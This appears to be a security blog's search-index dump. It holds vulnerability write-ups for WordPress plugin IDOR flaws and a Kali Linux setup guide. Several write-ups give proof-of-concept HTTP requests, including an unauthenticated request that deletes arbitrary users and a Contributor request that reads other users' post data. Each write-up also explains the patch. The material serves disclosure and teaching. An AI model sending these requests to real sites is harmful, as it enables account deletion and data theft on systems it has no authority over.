payment_method_id)\"] E --\u003e F[\"Check get_user_meta(member_id, 'urm_user_just_created')\"] F --\u003e|Not exists| G[\"Request rejected\"] F --\u003e|Exists| H[\"Call create_subscription()\"] H --\u003e I{\"Stripe subscription valid?\"} I --\u003e|Yes| J[\"Return success response\"] I --\u003e|No| K[\"wp_delete_user(member_id)\"] K --\u003e L[\"Target user deleted\"] flowchart TD A[\"Attacker (Unauthenticated)\"] --\u003e B[\"Send POST request to admin-ajax.php?action=user_registration_membership_create_stripe_subscription\"] B --\u003e C[\"WordPress routes request via wp_ajax_nopriv_*\"] C --\u003e D[\"create_stripe_subscription() executed\"] D --\u003e E[\"Read POST parameters (member_id, customer_id, payment_method_id)\"] E --\u003e F[\"Check get_user_meta(member_id, 'urm_user_just_created')\"] F --\u003e|Not exists| G[\"Request rejected\"] F --\u003e|Exists| H[\"Call create_subscription()\"] H --\u003e I{\"Stripe subscription valid?\"} I --\u003e|Yes| J[\"Return success response\"] I --\u003e|No| K[\"wp_delete_user(member_id)\"] K --\u003e L[\"Target user deleted\"] ","date":"2025-12-25","objectID":"/posts/2025-12-25-cve-2025-3281/:4:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3281 Analysis \u0026 PoC","uri":"/posts/2025-12-25-cve-2025-3281/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Visit /membership-registration/? and obtain the _confirm_payment_nonce value from the response. Send the request: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: wordpress_test_cookie=WP%20Cookie%20check; isSidebarEnabled=true; __stripe_mid=f13365af-449c-4412-b77c-7213da0dbe814d9925; __stripe_sid=7323a342-4cac-4124-9d98-a02abd109a8cd8d073; wp_lang=en_US action=user_registration_membership_create_stripe_subscription\u0026_ajax_nonce=472f729de7\u0026member_id=member_id_to_delete ","date":"2025-12-25","objectID":"/posts/2025-12-25-cve-2025-3281/:5:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3281 Analysis \u0026 PoC","uri":"/posts/2025-12-25-cve-2025-3281/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-3281 vulnerability arises because create_stripe_subscription() allows unauthenticated access while directly processing user-controlled input. The lack of permission checks on member_id, combined with exposure through wp_ajax_nopriv_*, enables attackers to delete user accounts arbitrarily. The patch in version 4.2.2 fixes this by enforcing proper authorization checks using current_user_can, fully preventing the IDOR issue. ","date":"2025-12-25","objectID":"/posts/2025-12-25-cve-2025-3281/:6:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3281 Analysis \u0026 PoC","uri":"/posts/2025-12-25-cve-2025-3281/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Nonces do not replace proper authorization checks. wp_ajax_nopriv_* endpoints must be strictly controlled. Sensitive actions (user deletion, state changes) should never rely solely on client-supplied data. Always enforce permission checks (current_user_can) when modifying user resources. IDOR vulnerabilities often stem from missing business-logic authorization, not just technical mistakes. ","date":"2025-12-25","objectID":"/posts/2025-12-25-cve-2025-3281/:7:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3281 Analysis \u0026 PoC","uri":"/posts/2025-12-25-cve-2025-3281/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References IDOR WordPress User Registration Plugin \u003c= 4.2.1 is vulnerable to Insecure Direct Object References (IDOR) ","date":"2025-12-25","objectID":"/posts/2025-12-25-cve-2025-3281/:8:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-3281 Analysis \u0026 PoC","uri":"/posts/2025-12-25-cve-2025-3281/#references"},{"categories":["Pentest"],"collections":null,"content":"Share the process of setting up Kali Linux for pentesting, optimizing the working environment and commonly used tools.","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/"},{"categories":["Pentest"],"collections":null,"content":"Update \u0026 Upgrade sudo apt update -y \u0026\u0026 sudo apt update -y \u0026\u0026 sudo apt full-upgrade -y ","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/:1:0","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/#update--upgrade"},{"categories":["Pentest"],"collections":null,"content":"Install Fcitx5 Unikey sudo apt install fcitx5 fcitx5-unikey fcitx5-config-qt fcitx5-frontend-gtk3 fcitx5-frontend-gtk2 -y Configure: fcitx5-configtool ","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/:2:0","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/#install-fcitx5-unikey"},{"categories":["Pentest"],"collections":null,"content":"Install VSCode Download from https://code.visualstudio.com/download or use terminal: wget -O vscode.deb \"https://code.visualstudio.com/sha/download?build=stable\u0026os=linux-deb-x64 sudo apt install ./vscode.deb ","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/:3:0","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/#install-vscode"},{"categories":["Pentest"],"collections":null,"content":"Install Hugo for Blog Download wget https://github.com/gohugoio/hugo/releases/download/v0.153.0/hugo_extended_0.153.0_linux-amd64.tar.gz Extract and install tar -xvzf hugo_extended_*_linux-amd64.tar.gz sudo mv hugo /usr/local/bin/ ","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/:4:0","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/#install-hugo-for-blog"},{"categories":["Pentest"],"collections":null,"content":"Remove Underline in Zsh nano ~/.zshrc (( ${+ZSH_HIGHLIGHT_STYLES} )) || typeset -A ZSH_HIGHLIGHT_STYLES ZSH_HIGHLIGHT_STYLES[path]=none ZSH_HIGHLIGHT_STYLES[path_prefix]=none Change all underline to none -ZSH_HIGHLIGHT_STYLES[unknown-token]=underline +ZSH_HIGHLIGHT_STYLES[unknown-token]=none source ~/.zshrc ","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/:5:0","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/#remove-underline-in-zsh"},{"categories":["Pentest"],"collections":null,"content":"eza for ls output Install sudo apt install eza Configure nano ~/.zshrc alias ls='eza --group-directories-first' alias ll='eza -lah --group-directories-first' alias la='eza -a --group-directories-first' alias lt='eza --tree --group-directories-first' source ~/.zshrc ","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/:6:0","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/#eza-for-ls-output"},{"categories":["Pentest"],"collections":null,"content":"grc for Color Output Install sudo apt install grc -y Configure nano ~/.zshrc # Auto alias commands supported by grc (except ls) if command -v grc \u003e/dev/null; then for f in /usr/share/grc/conf.*; do cmd=\"${f##*/conf.}\" [ \"$cmd\" = \"ls\" ] \u0026\u0026 continue alias \"$cmd=grc $cmd\" done fi source ~/.zshrc ","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/:7:0","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/#grc-for-color-output"},{"categories":["Pentest"],"collections":null,"content":"fzf – fuzzy finder sudo apt install fzf ","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/:8:0","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/#fzf--fuzzy-finder"},{"categories":["Pentest"],"collections":null,"content":"bat for Reading Files Install sudo apt install bat Configure nano ~/.zshrc alias bat=\"batcat\" source ~/.zshrc ","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/:9:0","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/#bat-for-reading-files"},{"categories":["Pentest"],"collections":null,"content":"Font sudo apt install fonts-firacode fonts-jetbrains-mono ","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/:10:0","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/#font"},{"categories":["Pentest"],"collections":null,"content":"Some alias nano ~/.zshrc alias ports='ss -tulnp' alias myip='ip a | grep inet' alias serve='python3 -m http.server' alias cls='clear' source ~/.zshrc ","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/:11:0","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/#some-alias"},{"categories":["Pentest"],"collections":null,"content":"Golang Tải sudo apt install golang-go -y Cấu hình nano ~/.zshrc export PATH=\"$HOME/go/bin:$PATH\" source ~/.zshrc ","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/:12:0","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/#golang"},{"categories":["Pentest"],"collections":null,"content":"Some Tool from Project Discovery nuclei go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest nuclei -update-templates httpx go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest subfinder go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest dnsx go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest katana go install -v github.com/projectdiscovery/katana/cmd/katana@latest assetfinder go install github.com/tomnomnom/assetfinder@latest chaos-client go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest uncover go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest ","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/:13:0","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/#some-tool-from-project-discovery"},{"categories":["Pentest"],"collections":null,"content":"Docker sudo apt install -y docker.io sudo systemctl start docker sudo usermod -aG docker $USER sudo apt install docker-compose -y ","date":"2025-12-25","objectID":"/posts/2025-12-25-setup-kali-for-pentest/:14:0","tags":["setup","kali"],"title":"Setup Kali Linux for Pentest","uri":"/posts/2025-12-25-setup-kali-for-pentest/#docker"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress ARTMKit Plugin.","date":"2025-12-24","objectID":"/posts/2025-12-24-cve-2025-64283/","tags":["analyst","plugin","idor"],"title":"CVE-2025-64283 Analysis \u0026 POC","uri":"/posts/2025-12-24-cve-2025-64283/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info An Authorization Bypass vulnerability through a User-Controlled Key in Rometheme RTMKit (rometheme-for-elementor) allows exploitation of incorrectly configured access control mechanisms. This vulnerability affects RTMKit from n/a through version ≤ 1.6.7. CVE ID: CVE-2025-64283 Vulnerability Type: Insecure Direct Object References (IDOR) Affected Versions: \u003c= 1.6.7 Patched Versions: 1.6.8 CVSS severity: Low (5.4) Required Privilege: Contributor Product: WordPress ARTMKit Plugin ","date":"2025-12-24","objectID":"/posts/2025-12-24-cve-2025-64283/:1:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-64283 Analysis \u0026 POC","uri":"/posts/2025-12-24-cve-2025-64283/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – ARTMKit: 1.6.7 – vulnerable 1.6.8 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-24","objectID":"/posts/2025-12-24-cve-2025-64283/:2:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-64283 Analysis \u0026 POC","uri":"/posts/2025-12-24-cve-2025-64283/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers the following action hook: template.php v1.6.7 add_action('wp_ajax_get_template_content', [$this, 'get_template_content']); In WordPress, the wp_ajax_ prefix is used to handle AJAX requests sent to /wp-admin/admin-ajax.php from authenticated users. When a request includes the parameter action=get_template_content, WordPress invokes the corresponding get_template_content function to process and return data. template.php v1.6.7 public function get_template_content() { if (!isset($_POST['wpnonce']) || ! check_ajax_referer('rtm_template_nonce', 'wpnonce')) { wp_send_json_error('Access Denied'); wp_die(); } $id = absint($_POST['template']); $elementorData = get_post_meta($id, '_elementor_data', true); $data = ['content' =\u003e json_decode($elementorData)]; wp_send_json_success($data); } The get_template_content function processes the AJAX request as follows: Checks the existence of wpnonce and validates it using check_ajax_referer to ensure request legitimacy and CSRF protection. Tip When searching for the keyword rtm_template_nonce How the nonce is created The nonce is generated using wp_create_nonce('rtm_template_nonce') and attached to the JavaScript object rkit_libs via wp_localize_script with the storage key template_nonce. The client uses this value and sends it back in the AJAX request as the wpnonce parameter for validation. When filtering requests in BurpSuite using the keyword rkit_libs, this value can be observed. Nonce value Retrieves the template parameter from POST and casts it to an integer using absint. Fetches the _elementor_data meta value associated with the post ID via get_post_meta. Decodes the JSON data and wraps it in a response array. Returns the data via a successful JSON response (wp_send_json_success). Bug The vulnerability arises because $id is not properly access-controlled, allowing Contributor+ users to retrieve arbitrary post data belonging to other users. Patch v1.6.8 introduces an additional user capability check using current_user_can('manage_options'): if (!current_user_can('manage_options')) { wp_send_json_error('Access Denied: Insufficient permissions'); wp_die(); } This ensures that only users with Administrator privileges can proceed. Unauthorized users receive an Access Denied: Insufficient permissions response. ","date":"2025-12-24","objectID":"/posts/2025-12-24-cve-2025-64283/:3:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-64283 Analysis \u0026 POC","uri":"/posts/2025-12-24-cve-2025-64283/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow flowchart TD A[\"Authenticated Contributor\"] --\u003e B[\"Send POST request to admin-ajax.php\"] B --\u003e C[\"action=get_template_content\"] C --\u003e D[\"get_template_content() executed\"] D --\u003e E[\"check_ajax_referer passed\"] E --\u003e F[\"Control template ID parameter\"] F --\u003e G[\"get_post_meta(target_id, _elementor_data)\"] G --\u003e H[\"Return template content\"] flowchart TD A[\"Authenticated Contributor\"] --\u003e B[\"Send POST request to admin-ajax.php\"] B --\u003e C[\"action=get_template_content\"] C --\u003e D[\"get_template_content() executed\"] D --\u003e E[\"check_ajax_referer passed\"] E --\u003e F[\"Control template ID parameter\"] F --\u003e G[\"get_post_meta(target_id, _elementor_data)\"] G --\u003e H[\"Return template content\"] flowchart TD A[\"Authenticated Contributor\"] --\u003e B[\"Send POST request to admin-ajax.php\"] B --\u003e C[\"action=get_template_content\"] C --\u003e D[\"get_template_content() executed\"] D --\u003e E[\"check_ajax_referer passed\"] E --\u003e F[\"Control template ID parameter\"] F --\u003e G[\"get_post_meta(target_id, _elementor_data)\"] G --\u003e H[\"Return template content\"] flowchart TD A[\"Authenticated Contributor\"] --\u003e B[\"Send POST request to admin-ajax.php\"] B --\u003e C[\"action=get_template_content\"] C --\u003e D[\"get_template_content() executed\"] D --\u003e E[\"check_ajax_referer passed\"] E --\u003e F[\"Control template ID parameter\"] F --\u003e G[\"get_post_meta(target_id, _elementor_data)\"] G --\u003e H[\"Return template content\"] ","date":"2025-12-24","objectID":"/posts/2025-12-24-cve-2025-64283/:4:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-64283 Analysis \u0026 POC","uri":"/posts/2025-12-24-cve-2025-64283/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a post using Elementor with a Contributor+ user Capture the request using BurpSuite and extract the returned nonce value: \u003cscript id=\"rkit-library-script-js-extra\"\u003e var rkit_libs = {\"logo_url\":\"http://localhost/wp-content/plugins/rometheme-for-elementor//view/images/RTMKitNew.png\",\"ajax_url\":\"http://localhost/wp-admin/admin-ajax.php\",\"template_nonce\":\"nonce_value\"}; //# sourceURL=rkit-library-script-js-extra \u003c/script\u003e Send a request with template=id_of_other_post POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: contributor_cookie action=get_template_content\u0026wpnonce=bea52715a7\u0026template=25 Result: Administrator post content Other AJAX actions affected by the same issue: wp_ajax_fetch_lib wp_ajax_fetch_envato_template wp_ajax_get_installed_template wp_ajax_get_installed_templates wp_ajax_template_category ","date":"2025-12-24","objectID":"/posts/2025-12-24-cve-2025-64283/:5:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-64283 Analysis \u0026 POC","uri":"/posts/2025-12-24-cve-2025-64283/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-64283 stems from the plugin relying solely on nonce validation for AJAX request authentication without enforcing role-based authorization checks. This allows lower-privileged users (Contributor+) to control the template parameter and access _elementor_data of posts they do not own. Version 1.6.8 mitigates the issue by introducing a proper administrator-level capability check. ","date":"2025-12-24","objectID":"/posts/2025-12-24-cve-2025-64283/:6:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-64283 Analysis \u0026 POC","uri":"/posts/2025-12-24-cve-2025-64283/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Nonces do not replace authorization controls. WordPress AJAX actions must validate appropriate user capabilities, not just authentication. User-controlled object identifiers (IDs) must be strictly bound to access permissions. IDOR vulnerabilities commonly arise from improperly enforced access control in AJAX logic. ","date":"2025-12-24","objectID":"/posts/2025-12-24-cve-2025-64283/:7:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-64283 Analysis \u0026 POC","uri":"/posts/2025-12-24-cve-2025-64283/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References IDOR WordPress ARTMKit Plugin \u003c= 1.6.7 is vulnerable to Insecure Direct Object References (IDOR) ","date":"2025-12-24","objectID":"/posts/2025-12-24-cve-2025-64283/:8:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-64283 Analysis \u0026 POC","uri":"/posts/2025-12-24-cve-2025-64283/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Accessibility Checker by Equalize Digital Plugin.","date":"2025-12-22","objectID":"/posts/2025-12-22-cve-2025-57886/","tags":["analyst","plugin","idor"],"title":"CVE-2025-57886 Analysis \u0026 POC","uri":"/posts/2025-12-22-cve-2025-57886/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Authorization Bypass via User-Controlled Key vulnerability in the Equalize Digital Accessibility Checker plugin by Equalize Digital allows exploitation of misconfigured access control levels. This vulnerability affects Accessibility Checker by Equalize Digital from an unspecified version up to 1.30.0. CVE ID: CVE-2025-57886 Vulnerability Type: Insecure Direct Object References (IDOR) Affected Versions: \u003c= 1.30.0 Patched Versions: 1.30.1 CVSS severity: Low (5.4) Required Privilege: Contributor Product: WordPress Accessibility Checker by Equalize Digital Plugin ","date":"2025-12-22","objectID":"/posts/2025-12-22-cve-2025-57886/:1:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-57886 Analysis \u0026 POC","uri":"/posts/2025-12-22-cve-2025-57886/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Accessibility Checker by Equalize Digital: 1.30.0 – vulnerable * 1.30.1 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-22","objectID":"/posts/2025-12-22-cve-2025-57886/:2:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-57886 Analysis \u0026 POC","uri":"/posts/2025-12-22-cve-2025-57886/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registered a REST API: wclass-rest-api.php v1.30.0 public function init_rest_routes() { $ns = 'accessibility-checker/'; $version = 'v1'; add_action( 'rest_api_init', function () use ( $ns, $version ) { register_rest_route( $ns . $version, '/post-scan-results/(?P\u003cid\u003e\\d+)', [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'set_post_scan_results' ], 'args' =\u003e [ 'id' =\u003e [ 'validate_callback' =\u003e function ( $param ) { return is_numeric( $param ); }, ], ], 'permission_callback' =\u003e function () { return current_user_can( 'edit_posts' ); }, ] ); } ); } Looking at the logic of the code, we can draw several important points: Namespace and route The endpoint is located under accessibility-checker/v1 with the route /post-scan-results/{id}. The id parameter is defined as a number, thanks to the regex \\d+ and validate_callback. This is a basic check, but it does not verify if the id exists or belongs to a specific post type. HTTP Method The route only accepts POST, suggesting that this is an endpoint for writing or updating data, not just reading. Permission Check The permission_callback only checks for the general capability edit_posts (Contributor+). The decision to allow or deny the request is not based on a specific post, meaning **a user with general permissions will be allowed to manipulate any id**. Processing Callback If permissions are bypassed, WordPress calls set_post_scan_results with the $id provided by the client. Here, the entire data processing logic completely trusts the id value controlled by the client. wclass-rest-api.php v1.30.0 public function set_post_scan_results( $request ) { if ( ! isset( $request['violations'] ) ) { return new \\WP_REST_Response( [ 'message' =\u003e 'A required parameter is missing.' ], 400 ); } $post_id = (int) $request['id']; $post = get_post( $post_id ); if ( ! is_object( $post ) ) { return new \\WP_REST_Response( [ 'message' =\u003e 'The post is not valid.' ], 400 ); } $post_type = get_post_type( $post ); $post_types = Helpers::get_option_as_array( 'edac_post_types' ); if ( empty( $post_types ) || ! in_array( $post_type, $post_types, true ) ) { return new \\WP_REST_Response( [ 'message' =\u003e 'The post type is not set to be scanned.' ], 400 ); } $rules = edac_register_rules(); $js_rule_ids = []; $combined_rule_ids = []; ... try { do_action( 'edac_before_validate', $post_id, 'js' ); $violations = $request['violations']; edac_remove_corrected_posts( $post_id, $post-\u003epost_type, 1, 'js' ); if ( is_array( $violations ) \u0026\u0026 count( $violations ) \u003e 0 ) { foreach ( $violations as $violation ) { $rule_id = $violation['ruleId']; $actual_rule_id = $combined_rule_ids[ $rule_id ] ?? $rule_id; if ( in_array( $actual_rule_id, $js_rule_ids, true ) ) { ... ( new Insert_Rule_Data() )-\u003einsert( $post, $actual_rule_id, $impact, $html, $landmark, $landmark_selector, $selectors ); ... } } } do_action( 'edac_after_validate', $post_id, 'js' ); edac_remove_corrected_posts( $post_id, $post-\u003epost_type, 2, 'js' ); $metrics = $request['densityMetrics'] ?? [ 0, 0 ]; update_post_meta( $post_id, '_edac_density_data', [ $metrics['elementCount'] ?? 0, $metrics['contentLength'] ?? 0 ] ); ( new Summary_Generator( $post_id ) )-\u003egenerate_summary(); update_post_meta( $post_id, '_edac_post_checked_js', time() ); do_action( 'edac_validate_before_sending_rest_response', $post_id, 'js', $request ); return new \\WP_REST_Response( [ 'success' =\u003e true, 'id' =\u003e $post_id, 'timestamp' =\u003e time() ] ); } catch ( \\Exception $ex ) { return new \\WP_REST_Response( [ 'message' =\u003e $ex-\u003egetMessage() ], 500 ); } } The function receives a request from the REST API and processes the accessibility scan results for a post. The main logic flow includes: Input Validation if ( ! isset( $request['violations'] ) ) { return new \\WP_REST_Response([ 'message' =\u003e 'Missing violations' ], 400); } $post_id = (int) $request['id']; $post = get_post( $post_id ); if ( ! is_object( $post ) ) { return new \\WP_REST_Response([ 'message' =\u003e 'Invalid post' ], 400); } Post Type Check","date":"2025-12-22","objectID":"/posts/2025-12-22-cve-2025-57886/:3:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-57886 Analysis \u0026 POC","uri":"/posts/2025-12-22-cve-2025-57886/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow flowchart TD A[\"Authenticated attacker (Contributor+)\"] --\u003e B[\"Craft POST request to REST API\"] B --\u003e C[\"POST /wp-json/accessibility-checker/v1/post-scan-results/{id}\"] C --\u003e D[\"Manipulate {id} to target post_id\"] D --\u003e E[\"permission_callback: current_user_can('edit_posts')\"] E --\u003e F[\"Permission granted\"] F --\u003e G[\"set_post_scan_results()\"] G --\u003e H[\"get_post(target_post_id)\"] H --\u003e I[\"Process violations data\"] I --\u003e J[\"update_post_meta(target_post_id, *edac**)\"] J --\u003e K[\"Target post data modified\"] flowchart TD A[\"Authenticated attacker (Contributor+)\"] --\u003e B[\"Craft POST request to REST API\"] B --\u003e C[\"POST /wp-json/accessibility-checker/v1/post-scan-results/{id}\"] C --\u003e D[\"Manipulate {id} to target post_id\"] D --\u003e E[\"permission_callback: current_user_can('edit_posts')\"] E --\u003e F[\"Permission granted\"] F --\u003e G[\"set_post_scan_results()\"] G --\u003e H[\"get_post(target_post_id)\"] H --\u003e I[\"Process violations data\"] I --\u003e J[\"update_post_meta(target_post_id, *edac**)\"] J --\u003e K[\"Target post data modified\"] flowchart TD A[\"Authenticated attacker (Contributor+)\"] --\u003e B[\"Craft POST request to REST API\"] B --\u003e C[\"POST /wp-json/accessibility-checker/v1/post-scan-results/{id}\"] C --\u003e D[\"Manipulate {id} to target post_id\"] D --\u003e E[\"permission_callback: current_user_can('edit_posts')\"] E --\u003e F[\"Permission granted\"] F --\u003e G[\"set_post_scan_results()\"] G --\u003e H[\"get_post(target_post_id)\"] H --\u003e I[\"Process violations data\"] I --\u003e J[\"update_post_meta(target_post_id, *edac**)\"] J --\u003e K[\"Target post data modified\"] flowchart TD A[\"Authenticated attacker (Contributor+)\"] --\u003e B[\"Craft POST request to REST API\"] B --\u003e C[\"POST /wp-json/accessibility-checker/v1/post-scan-results/{id}\"] C --\u003e D[\"Manipulate {id} to target post_id\"] D --\u003e E[\"permission_callback: current_user_can('edit_posts')\"] E --\u003e F[\"Permission granted\"] F --\u003e G[\"set_post_scan_results()\"] G --\u003e H[\"get_post(target_post_id)\"] H --\u003e I[\"Process violations data\"] I --\u003e J[\"update_post_meta(target_post_id, *edac**)\"] J --\u003e K[\"Target post data modified\"] ","date":"2025-12-22","objectID":"/posts/2025-12-22-cve-2025-57886/:4:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-57886 Analysis \u0026 POC","uri":"/posts/2025-12-22-cve-2025-57886/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create/edit a post with a Contributor account. Capture the request to /wp-json/accessibility-checker/v1/post-scan-results/{id}. Resend the request with the id of another user’s post and arbitrary violations. ","date":"2025-12-22","objectID":"/posts/2025-12-22-cve-2025-57886/:5:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-57886 Analysis \u0026 POC","uri":"/posts/2025-12-22-cve-2025-57886/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-57886 is an IDOR vulnerability in the REST API caused by the Accessibility Checker by Equalize Digital plugin only checking permissions at a general capability level (edit_posts) without validating editing permissions on a specific post. This allows an attacker with Contributor privileges to arbitrarily manipulate the id parameter in the REST API request to write or overwrite accessibility data on posts they do not own, leading to unauthorized data modification. Version 1.30.1 fixed this by applying post-level authorization via current_user_can('edit_post', $post_id). ","date":"2025-12-22","objectID":"/posts/2025-12-22-cve-2025-57886/:6:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-57886 Analysis \u0026 POC","uri":"/posts/2025-12-22-cve-2025-57886/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways REST APIs using client-controlled object identifiers must always include permission checks on the specific object. A Global capability check (edit_posts) is insufficient to protect data-writing operations based on post_id. IDOR can occur even when the request is generated from valid client-side logic. In WordPress, current_user_can('edit_post', $post_id) is the standard measure to prevent post-level IDOR. REST endpoints that write data should be considered priority attack surfaces during plugin audits. ","date":"2025-12-22","objectID":"/posts/2025-12-22-cve-2025-57886/:7:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-57886 Analysis \u0026 POC","uri":"/posts/2025-12-22-cve-2025-57886/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References IDOR WordPress Accessibility Checker by Equalize Digital Plugin \u003c= 1.30.0 is vulnerable to Insecure Direct Object References (IDOR) ","date":"2025-12-22","objectID":"/posts/2025-12-22-cve-2025-57886/:8:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-57886 Analysis \u0026 POC","uri":"/posts/2025-12-22-cve-2025-57886/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Timetable and Event Schedule Plugin.","date":"2025-12-21","objectID":"/posts/2025-12-21-cve-2025-12954/","tags":["analyst","plugin","idor"],"title":"CVE-2025-12954 Analysis \u0026 POC","uri":"/posts/2025-12-21-cve-2025-12954/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Timetable and Event Schedule by MotoPress WordPress plugin prior to version 2.4.16 does not verify whether a user has permission to access a specific event when performing the duplicate action, allowing users with roles as low as Contributor to arbitrarily disclose events. CVE ID: CVE-2025-12954 Vulnerability Type: Insecure Direct Object References (IDOR) Affected Versions: \u003c= 2.4.15 Patched Versions: 2.4.16 CVSS severity: Low (4.3) Required Privilege: Contributor Product: WordPress Timetable and Event Schedule Plugin ","date":"2025-12-21","objectID":"/posts/2025-12-21-cve-2025-12954/:1:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-12954 Analysis \u0026 POC","uri":"/posts/2025-12-21-cve-2025-12954/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Timetable and Event Schedule: 2.4.15 – vulnerable * 2.4.16 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-21","objectID":"/posts/2025-12-21-cve-2025-12954/:2:0","tags":["analyst","plugin","idor"],"title":"CVE-2025-12954 Analysis \u0026 POC","uri":"/posts/2025-12-21-cve-2025-12954/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin has registered an action hook: class-hooks.php v2.4.15 add_action( 'post_action_mptt_duplicate_event', array( $this-\u003eget( 'events' ), 'post_action_mptt_duplicate_event' ) ); In WordPress, hooks with the post_action_ 